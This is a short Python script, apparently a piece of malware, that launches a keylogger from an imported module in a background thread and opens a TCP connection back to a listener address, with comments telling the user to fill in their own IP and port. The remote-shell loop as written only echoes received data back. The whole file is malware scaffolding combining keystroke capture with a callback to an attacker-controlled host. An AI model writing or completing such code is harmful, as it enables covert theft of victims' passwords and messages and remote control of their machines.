from threading import Thread
import keylogger
import socket

# Keylogger
init_keylogger=keylogger.keylogger_class()
thread_keylogger=Thread(target=init_keylogger.keylogger_funktion)
thread_keylogger.start()

# Shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",50000))              # You IP and Port!

try:
    while True:
        data = s.recv(1024)
        print(data)                         # You IP and Port! 
        s.send(data)


        if str(data.decode()) == "Bye!":
            raise ConnectionError("Client disconnected")

finally:
    s.close()
